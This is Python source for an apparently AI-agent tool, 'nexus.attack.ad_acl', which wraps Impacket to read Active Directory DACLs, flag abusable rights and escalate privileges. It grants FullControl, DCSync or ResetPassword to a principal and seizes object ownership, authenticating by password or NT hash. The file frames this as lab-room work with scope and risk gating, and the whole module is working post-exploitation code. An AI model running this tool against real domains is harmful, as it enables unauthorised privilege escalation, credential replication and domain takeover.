"""Durable ``nexus.attack.ad_acl`` handler: read and abuse AD object ACLs.

The last mile of most AD rooms is not a exploit but a **permission**: an
operator-controlled principal holds ``GenericAll``/``WriteDacl``/``WriteOwner``
over an object, and that right is the whole escalation. DeadDrop (2026-10-22)
stopped exactly there: the engine had ``netexec`` (who am I, what group) and
``impacket_changepasswd``, but no governed way to *read* the DACL of an object
or to *write* one, so phase 5 depended on the operator leaving OMNI and chaining
``impacket-dacledit`` by hand — which means the escalation was never accredited.

Two primitives, both from Impacket and both resolved the way every other
impacket handler resolves its binary (``impacket-dacledit`` on Debian, also
``dacledit.py`` and ``dacledit``):

* ``read`` — print the DACL of ``target`` from the DC's LDAP and return the
  ACEs whose right is *abusable*, so the next step is a decision instead of a
  guess. **The read is the verification**: an LDAP error is a declared negative,
  not an empty list.
* ``write`` — grant ``rights`` (``FullControl``, ``WriteMembers``, ``DCSync``,
  ``ResetPassword``…) on ``target`` to ``principal``.
* ``take_ownership`` — set ``principal`` as the owner of ``target``
  (``impacket-owneredit``), the step that turns ``WriteOwner`` into
  ``WriteDacl`` and then into ``FullControl``.

``write``/``take_ownership`` are declared ``HIGH``: they change the directory.
A tool that succeeded prints ``DACL modified successfully!`` — the marker is
required before anything is reported as verified.
"""

from __future__ import annotations

import re
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult

from ._ad import ad_sandbox, validate_domain, validate_host, validate_username
from ._exec import run_in_sandbox
from ._impacket_resolver import resolve_impacket_binary

AD_ACL_ACTIONS = ("read", "write", "take_ownership")
AD_ACL_DEFAULT_TIMEOUT_SECONDS = 120
AD_ACL_MAX_TIMEOUT_SECONDS = 600
#: ``-rights`` accepts exactly these (``impacket-dacledit -h``).
AD_ACL_RIGHTS = ("FullControl", "ResetPassword", "WriteMembers", "DCSync", "Custom")
AD_ACL_DEFAULT_RIGHTS = "FullControl"
#: Rights worth a next step: holding any of them on a target is an escalation
#: path, holding only ``ReadProperty`` is not.
AD_ACL_ABUSABLE_RIGHTS = (
    "GenericAll",
    "GenericWrite",
    "WriteDacl",
    "WriteOwner",
    "FullControl",
    "WriteMembers",
    "AddMember",
    "DCSync",
    "ResetPassword",
    "AllExtendedRights",
    "Owner",
    "Self",
)
#: Markers Impacket prints only after the write reached the DC.
AD_ACL_WRITE_MARKERS = ("dacl modified successfully", "owner modified successfully")

_ACE_START_RE = re.compile(r"ACE\[(\d+)\]", re.IGNORECASE)
#: ``key : value`` rows of a block. Impacket prints ``Trustee (SID)   : X`` and
#: the older builds printed ``trustee: - X``; both are one label plus a value.
#: Impacket logs every line behind a ``[*]``/``[+]``/``[-]`` marker; without
#: dropping it the label never sits at the start of the line.
_LOG_PREFIX_RE = re.compile(r"^(?:\[[^\]]{1,3}\]\s*)+")
_ROW_RE = re.compile(r"^([A-Za-z][A-Za-z0-9 ()_/-]*?)\s*:\s*-?\s*(.*)$")
_SID_RE = re.compile(r"(S-1-(?:\d+-)+\d+)")
_HEX_MASK_RE = re.compile(r"\s*\(0x[0-9a-fA-F]+\)\s*$")

#: ``Access mask`` / ``rights`` token → the canonical right this tool reasons
#: about. Impacket prints either the simple permission (``FullControl``,
#: ``Modify``) or an ``ACCESS_MASK`` member (``WRITE_DAC``, ``GenericAll``).
_RIGHT_ALIASES = {
    "fullcontrol": "FullControl",
    "full control": "FullControl",
    "genericall": "GenericAll",
    "genericwrite": "GenericWrite",
    "modify": "GenericWrite",
    "writedacl": "WriteDacl",
    "write_dac": "WriteDacl",
    "write dac": "WriteDacl",
    "writeowner": "WriteOwner",
    "write_owner": "WriteOwner",
    "write owner": "WriteOwner",
    "allextendedrights": "AllExtendedRights",
    "controlaccess": "AllExtendedRights",
    "writemembers": "WriteMembers",
    "writeproperty": "WriteProperty",
    "writeproperties": "WriteProperty",
    "self": "Self",
    "dcsync": "DCSync",
    "resetpassword": "ResetPassword",
    "addmember": "AddMember",
}

#: ``Object type (GUID)`` name → right. An object-specific ACE carries the right
#: in the GUID, not in the mask: ``User-Force-Change-Password`` *is* a password
#: reset, and ``DS-Replication-Get-Changes-All`` *is* DCSync.
_OBJECT_TYPE_RIGHTS = (
    ("force-change-password", "ResetPassword"),
    ("change-password", "ResetPassword"),
    ("replication-get-changes", "DCSync"),
    ("membership", "AddMember"),
    ("write-members", "WriteMembers"),
)
#: Lines Impacket prints when LDAP refused the operation.
_AD_ERROR_RE = re.compile(
    r"ldaperror|invalidcredentials|insufficientaccess|"
    # ``could not find`` is deliberately absent: a missing object is a bad
    # argument, not a refusal, and conflating them hides a typo behind "denied".
    r"could not bind|rpc_s_|access is denied",
    re.IGNORECASE,
)


def ad_acl_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.attack.ad_acl``."""
    return ToolDefinition(
        tool_id="nexus.attack.ad_acl",
        name="AD object ACL: read, write, take ownership",
        tenant_id=tenant_id,
        description=(
            "Lee y abusa los permisos (DACL) de un objeto de AD, que es el "
            "último tramo de la mayoría de las salas de dominio. "
            "action=read: imprime la DACL de `target` y devuelve los ACEs con "
            "permiso abusable (GenericAll, WriteDacl, WriteOwner, WriteMembers, "
            "DCSync, ResetPassword…) sobre el objeto; un error LDAP es un "
            "negativo declarado, no una lista vacía. "
            "action=write: concede `rights` sobre `target` a `principal` "
            "(GenericAll sobre un grupo = poder añadirte a él). "
            "action=take_ownership: pone a `principal` como dueño de `target`, "
            "el paso que convierte WriteOwner en WriteDacl y luego en "
            "FullControl. HIGH: write y take_ownership modifican el directorio."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": list(AD_ACL_ACTIONS),
                    "default": "read",
                },
                "target": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 255,
                    "description": "IP o host del DC con el que se habla.",
                },
                "target_object": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 255,
                    "description": (
                        "Objeto cuya DACL se lee o modifica: sAMAccountName "
                        "(p. ej. 'Domain Admins')."
                    ),
                },
                "target_dn": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 512,
                    "description": "DN del objeto, cuando el sAMAccountName es ambiguo.",
                },
                "principal": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 255,
                    "description": (
                        "Principal que se referencia en el ACE: el que recibe el "
                        "permiso (write) o el que pasa a ser dueño "
                        "(take_ownership). Suele ser tu propio usuario."
                    ),
                },
                "domain": {"type": "string", "minLength": 1, "maxLength": 255},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password": {"type": "string", "maxLength": 512},
                "hash": {
                    "type": "string",
                    "maxLength": 65,
                    "description": "Hash NT de `username` (32 hex o LM:NT).",
                },
                "rights": {
                    "type": "string",
                    "enum": list(AD_ACL_RIGHTS),
                    "default": AD_ACL_DEFAULT_RIGHTS,
                    "description": "Derecho a conceder (solo action=write).",
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 30,
                    "maximum": AD_ACL_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["action", "target", "domain", "username"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        effect="post_exploitation",
        required_permissions=["execute:tool:nexus.attack.ad_acl"],
        timeout_seconds=AD_ACL_MAX_TIMEOUT_SECONDS * 2,
        max_output_bytes=2_000_000,
        scope_target_field="target",
        scope_required=True,
    )


def validate_ad_hash(value: Any) -> str:
    """Return ``LM:NT`` or a bare NT hash, or raise ``ValueError``."""
    text = str(value or "").strip()
    if not text:
        raise ValueError("hash is empty")
    parts = text.split(":")
    if len(parts) > 2 or not all(re.fullmatch(r"[0-9a-fA-F]{32}", part) for part in parts):
        raise ValueError("hash must be 32 hex characters (or LM:NT)")
    return text


def validate_acl_rights(value: Any) -> str:
    """Return a ``-rights`` value from the tool's enum (case-corrected)."""
    text = str(value or AD_ACL_DEFAULT_RIGHTS).strip()
    for right in AD_ACL_RIGHTS:
        if right.lower() == text.lower():
            return right
    raise ValueError(f"unsupported rights: {text!r}")


def _identity(domain: str, username: str, password: str | None) -> str:
    """Build Impacket's ``domain/user[:password]`` positional."""
    return f"{domain}/{username}" + (f":{password}" if password else "")


def _canonical_right(token: str) -> str | None:
    """Map an ``Access mask`` token onto the canonical right, or ``None``."""
    key = _HEX_MASK_RE.sub("", token).strip().strip("-").strip().lower()
    if not key:
        return None
    return _RIGHT_ALIASES.get(key)


def _rights_from_row(label: str, value: str) -> list[str]:
    """Return the canonical rights a labelled row declares."""
    rights: list[str] = []
    lowered = label.lower()
    if "object type" in lowered:
        name = value.split("(", 1)[0].strip().lower()
        for needle, right in _OBJECT_TYPE_RIGHTS:
            if needle in name:
                rights.append(right)
                break
        return rights
    if not any(token in lowered for token in ("access mask", "access", "rights")):
        return rights
    for token in value.split(","):
        canonical = _canonical_right(token)
        if canonical and canonical not in rights:
            rights.append(canonical)
    return rights


def _parse_aces(stdout: str) -> list[dict[str, Any]]:
    """Return one entry per ACE: ``{index, trustee, sid, rights, access}``.

    The parser keys on the ACE index (``ACE[n] info``) and then reads the block
    as labelled rows, which is the shape ``impacket-dacledit`` prints
    (``Access mask : FullControl, WRITE_DAC (0xf01ff)`` / ``Trustee (SID) :
    DOMAIN\\user (S-1-...)``). Older builds printed ``ACE[n] trustee: - X``, and
    that layout also parses because the label is still a label.

    ``access`` keeps the raw mask text so a right this module does not recognise
    is still visible to the model instead of being dropped silently.
    """
    blocks: dict[str, dict[str, Any]] = {}
    order: list[str] = []
    current: str | None = None
    for raw in (stdout or "").splitlines():
        line = _LOG_PREFIX_RE.sub("", raw.strip())
        if not line:
            continue
        start = _ACE_START_RE.search(line)
        if start:
            current = start.group(1)
            if current not in blocks:
                blocks[current] = {"index": int(current), "trustee": "", "sid": "",
                                   "rights": [], "access": ""}
                order.append(current)
            line = line[start.end():].strip()
        if current is None:
            continue
        block = blocks[current]
        row = _ROW_RE.match(line)
        if not row:
            continue
        label, value = row.group(1).strip(), row.group(2).strip()
        lowered = label.lower()
        if lowered.startswith("owner"):
            # ``Owner: DOMAIN\Domain Admins`` is the object's owner header, not
            # an ACE right; counting it as an abusable ACE would point the run
            # at a permission that grants nothing.
            continue
        if "trustee" in lowered:
            block["trustee"] = value
            sid = _SID_RE.search(value)
            if sid:
                block["sid"] = sid.group(1)
            continue
        if "access" in lowered or "rights" in lowered:
            block["access"] = value
        for right in _rights_from_row(label, value):
            if right not in block["rights"]:
                block["rights"].append(right)
    return [blocks[key] for key in order]


def _abusable(aces: list[dict[str, Any]], principal: str) -> list[dict[str, Any]]:
    """Return the ACEs that grant a next step, marking the caller's own ones."""
    wanted = principal.lower()
    abusable = []
    for ace in aces:
        if not set(ace["rights"]) & set(AD_ACL_ABUSABLE_RIGHTS):
            continue
        entry = dict(ace)
        entry["is_principal"] = bool(wanted) and wanted in ace["trustee"].lower()
        abusable.append(entry)
    return abusable


async def ad_acl_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Read or modify an AD object's DACL through the sandbox."""
    action = str(arguments.get("action") or "read").strip().lower()
    if action not in AD_ACL_ACTIONS:
        raise ValueError(f"unsupported action: {action!r}")
    target = validate_host(arguments.get("target"))
    domain = validate_domain(arguments.get("domain"))
    username = validate_username(arguments.get("username"))
    target_object = str(arguments.get("target_object") or "").strip()
    target_dn = str(arguments.get("target_dn") or "").strip()
    principal = str(arguments.get("principal") or "").strip()
    if not (target_object or target_dn):
        raise ValueError("target_object or target_dn is required")
    if action != "read" and not principal:
        raise ValueError(f"{action} requires principal")

    password = str(arguments["password"]) if arguments.get("password") else None
    ntlm_hash = validate_ad_hash(arguments["hash"]) if arguments.get("hash") else None
    if password and ntlm_hash:
        raise ValueError("pass either password or hash, not both")
    if not (password or ntlm_hash):
        raise ValueError("password or hash is required")
    rights = validate_acl_rights(arguments.get("rights"))

    requested_timeout = arguments.get("timeout_seconds")
    timeout_seconds = min(
        AD_ACL_MAX_TIMEOUT_SECONDS,
        max(30, int(requested_timeout) if requested_timeout
            else AD_ACL_DEFAULT_TIMEOUT_SECONDS),
    )

    binary_name = "owneredit" if action == "take_ownership" else "dacledit"
    binary = resolve_impacket_binary(binary_name)
    if not binary:
        return ToolResult(
            output={"error": f"{binary_name} is not installed"},
            verified=False,
            verification_method="ad_acl_unavailable",
            evidence={"action": action, "binary": f"impacket-{binary_name}"},
        )

    argv = [binary, "-dc-ip", target]
    if ntlm_hash:
        argv.extend(["-hashes", ntlm_hash])
    if target_dn:
        argv.extend(["-target-dn", target_dn])
    else:
        argv.extend(["-target", target_object])
    if action == "take_ownership":
        argv.extend(["-new-owner", principal, "-action", "write"])
    else:
        if principal:
            argv.extend(["-principal", principal])
        argv.extend(["-action", action])
        if action == "write":
            argv.extend(["-rights", rights])
    # The identity positional goes last: argparse binds ``-hashes``/``-target``
    # first, and an identity printed before them would be read as an option value.
    argv.append(_identity(domain, username, password))

    sandbox = ad_sandbox(str(context.project_root or "."), binary)
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_AD_ACL_IMAGE",
        default_image="impacket",
    )
    output_text = f"{result.stdout}\n{result.stderr}"
    evidence: dict[str, Any] = {
        "action": action,
        "target": target,
        "target_object": target_object or None,
        "target_dn": target_dn or None,
        "principal": principal or None,
        "rights": rights if action == "write" else None,
        "noise_level": "medium",
        "timeout_seconds": timeout_seconds,
        "exit_code": result.exit_code,
    }

    if result.timed_out:
        return ToolResult(
            output={"error": "ad acl operation timed out", "target": target},
            verified=False,
            verification_method="ad_acl_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    if action == "read":
        aces = _parse_aces(result.stdout)
        if not aces:
            # No ACE parsed: either LDAP refused (authoritative negative) or the
            # tool printed nothing usable. Saying "no permissions" here would be
            # the false negative that ends a run one step early.
            method = (
                "ad_acl_access_denied"
                if _AD_ERROR_RE.search(output_text)
                else "ad_acl_read_failed"
            )
            return ToolResult(
                output={
                    "action": "read",
                    "target_object": target_object or target_dn,
                    "error": "no ACE parsed",
                    "detail": output_text[-800:],
                },
                verified=False,
                verification_method=method,
                evidence=evidence,
                exit_code=result.exit_code,
                accepted_exit_codes=(0,),
                stdout=result.stdout,
                stderr=result.stderr,
            )
        abusable = _abusable(aces, principal or username)
        evidence.update(
            {
                "ace_count": len(aces),
                "abusable_count": len(abusable),
                "principal_holds": [
                    ace["index"] for ace in abusable if ace["is_principal"]
                ],
            }
        )
        return ToolResult(
            output={
                "action": "read",
                "target_object": target_object or target_dn,
                "ace_count": len(aces),
                "abusable": abusable,
                "principal_holds": [ace for ace in abusable if ace["is_principal"]],
                "all_aces": aces,
            },
            verified=True,
            verification_method="ad_acl_read",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    modified = any(marker in output_text.lower() for marker in AD_ACL_WRITE_MARKERS)
    evidence["verified_by"] = "impacket_marker" if modified else None
    return ToolResult(
        output={
            "action": action,
            "target_object": target_object or target_dn,
            "principal": principal,
            "rights": rights if action == "write" else "Owner",
            "modified": modified,
            "detail": None if modified else output_text[-800:],
        },
        verified=modified,
        verification_method=(
            f"ad_acl_{action}" if modified else f"ad_acl_{action}_refused"
        ),
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


__all__ = [
    "AD_ACL_ABUSABLE_RIGHTS",
    "AD_ACL_ACTIONS",
    "AD_ACL_RIGHTS",
    "ad_acl_definition",
    "ad_acl_handler",
    "validate_acl_rights",
    "validate_ad_hash",
]
